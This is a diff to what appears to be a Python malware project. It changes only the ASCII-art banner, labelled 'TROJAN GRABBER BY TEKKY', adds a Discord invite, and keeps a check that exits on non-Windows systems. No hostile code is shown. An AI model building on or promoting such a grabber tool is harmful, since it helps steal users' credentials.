@@ -7,43 +7,37 @@ if os.name != "nt":
     sys.exit()
 
 """
-                              ::                     .                                    
-                              ~Y:^^::!!J^~??!~^. .^~J.                                    
-                         :~:7YPGGGBBBB#BBBBBB#BGY5##B?:~:.                                
-                      .~?GBY7^.   ..JB~....^B7...:.:~YG#BBPJ~:                            
-                    ^!YBBY.         .^     :^     ..  .:7Y5G#BG7.                         
-                   .^J?^.  ::          ..        .!.^.     .!PB#B?^:...                   
-                 :55!.  :. ^?.         ::       .^.J!   ::   :::!YBBB!                    
-                ~BG.    ~J7.?P.        ?^     .^~!G~  ~?^ .^^.   .YBBBG?~.                
-              .YB?.     ^~YY:GG:      .B?    ^G?Y#?.!Y!.~5J:    .^:..7PBB?                
-             ^B#G        ::G55BB^     JBBG!.7GBGBBGP~^7GJ.      .:.   :PBBGG?^.           
-            ^BG~J:   ::   .5BBBBB?^:^JBBBBBBBBBBBBBG5BP:    .^?J!. .7PBBP7:.              
-           .GB~       ^~:.!GBBBBBBBBBBG5JPBBBGBBBBBBBBG?^^7YGP~..!5BB5!.                  
-           ~#G.       .JBBBBBBBBBBBBB7   .GBG.:^.:^7PBGBB##BY?JGB#Y~.                     
-           ?P.^        ?BBBBBGPY:?BBBG:  :BBG       .. ..~5BBB5.^?Y.                      
-           P?          PBBBBBB7.  ^5BBBJYGBBBPY!.          ^J:.   .:                      
-          .G.         !BB57!!JGGG7~5BBBBPY7~~!7YBGY!. .^:.                                
-          .G:      ..5BBY      7BB##BGY?~:.    ^7?J557?PB7                                
-           Y.     .GBBB~      ^GBG7~^:             ~YBBGGG.                               
-           ~!      7BBP      7BBB^     ..::.     :YBG?: .JG:                              
-            !.     :BB?     7#BG:   ^5Y??J5G5!.!5P?..    ^BG.                             
-             .     .PB7 .   PBB^  :5?:     :Y#B5: .:?:    ^B!                             
-                   :7BBP:  .BBB~  P!         JBPYYJGBG^   .PG                             
-                .!^^?GBB:  .BBB^  .          JBBGJ5PGBBGY!7GB.                            
-                 .^~~JBBP.  JBBG^  .      .7GBBBG~^...:~JBGBB:                            
-                  .:7YPBBG^  PBBG7  :~YY~!YGY7PBBB#BPY!~~:5BB:                            
-                      75PBB~ .PB5:^.  ^BBB! .^.7~.~~PPB#B?.P#J                            
-                       :~PBG. .GBJ    :BBBG:        : .GB! .GG                            
-                         ~JB?  ~BBJ   .BY:GB~.        .PB5  G#:                           
-                         ^YBG  ^BB#^ .5#5 .5#P.        JBB! ~Y5.                          
-                         .GB5  7BB7.!BB!.   5#?~!.   :. 5BB:  .:                          
-                        :7BB5 .BBP. ?#P      75PBBJ.?:~!:BBP                              
-                        ~GBB: 5#J!JYY?^         .^?PB5:5?~GB?                             
-                        :GB~:PBPY?~.                .~JPBYPBG.                            
-                      .?BJ.^7^.                         .^?5B^                            
-                     7B5:                                   ..                            
-                   :PP~                                                                   
-                .:!J~         TROJAN GRABBER BY TEKKY                                 
+                         ~:    .......     ::                              
+                     ..:~5GPGPPBBGGBBGG5!YGB!..                            
+                  .^7B5?~:...:5P:::.JP::^^^!YPBGP?^.                       
+                .~YGP~        ..    :     :  .:!J5BBP!                     
+               .~7~.   ~         :       ^:~:     :YPGPJ7~.                
+              JB~   ~~.!?       .!     .^^Y: .~: ...  :P#B7:.              
+            :5P:    ^?Y^GJ      7Y    J?JG^.77:~?~.   ^~^7GBP:             
+           !BB.  .   :?P5#5    .GBP~:YBGBGP?~75!.    .:   .5#G5?:.         
+          !#7~:  .:   ~BBBBP7~7P#BBBBBBBBBBPB5.   :7?~..!5BPJ^.            
+         .B5      .!77GBBBBBBBBY7^7BBPYPY5GBBBPJ5GP7~7YGG?:                
+         !G!.      7#BBBBB5YBBB!   GB!    .~7~7YGBGGYJG?                   
+         Y7        JBBBBB7. ^PBB?!YBBP7^         !5~   ~.                  
+         P.       ^BBJ7!?55Y~YBBBG57~!7YGP?: .^.                           
+         5.     :?BG!     5##BGY7^.    .^~7YJ5BG                           
+         7:    .BBB^    .YBG^..           ~GG5!5J                          
+         .!     ?#P    .PBG:  .!77JY?^ .!5Y~.  .GY                     TROJAN GRABBER BY TEKKY      
+          .     ~BY .  7#G:  7?~.  .?BG5~..^.   ^B^                    discord.gg/onlp    
+               .^PBP.  5BB. 7?       :BPYJPBG^.  55                        
+              ^^^JBB^  YBB:         .!BBP!7J5GGY?GG                        
+               ^!?GBG^ .GBG~ ..:^  !GGGBBY?~:.:7GBG.                       
+                 .7PGB7 ^BB?^  :PGG?^^~YJ?5GBGGJ:GB:                       
+                   ^7GB^ ^B5.   ?BBY       :.~BG :B?                       
+                     !GP  J#P.  JG:PP^       :BB. GG                       
+                     ~GB. ?BB~ 7B5  5#~       ?BP.:?!                      
+                     !BG .G#7 J#?    YGY5! .:^.P#?  .                      
+                    ~GBY JB?!!Y5:     .^!Y5PJ:J^GB^                        
+                    ~B5:JBP?7^.            :!JG5Y#P                        
+                  :?G~.~^.                     :!JP.                       
+                 !B?.                                                      
+               :YJ.                                                        
+              .:.                                                         
 """
 
 
